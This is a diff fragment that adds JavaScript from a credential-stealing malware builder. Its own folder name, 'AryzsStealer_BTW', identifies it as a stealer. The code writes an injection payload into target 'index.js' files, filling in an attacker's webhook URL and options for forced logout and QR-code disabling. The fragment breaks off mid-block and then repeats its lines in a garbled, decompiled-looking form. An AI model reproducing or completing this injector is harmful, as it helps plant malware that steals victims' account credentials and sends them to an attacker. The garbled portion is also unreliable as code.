@@ -1,0 +1,33 @@
+injectPath.forEach(file => {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                });
+
+                if (config["init-notify"] == "true") {
+                    let init = file.replace("index.js", "init")
+                    if (!fs.existsSync(init)) {
+                        fs.mkdirSync(init, 0744)
+                    }
+                }
+
+                if ( config.logout != "false" ) {
+                    let folder = file.replace("index.js", "AryzsStealer_BTW")
+                    if (!fs.existsSync(folder)) {
+                        fs.mkdirSync(folder, 0744)
+                        if (config.logout == "instant") {
+           ...
+fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                })
+_tmp_6.encoding = "utf8"
+_tmp_6.flag = "w"
+config["init-notify"] == "true"
+let init = file.replace("index.js", "init")
+!fs.existsSync(init)
+fs.mkdirSync(init, 0744)
+config.logout != "false"
+let folder = file.replace("index.js", "AryzsStealer_BTW")
+!fs.existsSync(folder)
+fs.mkdirSync(folder, 0744)
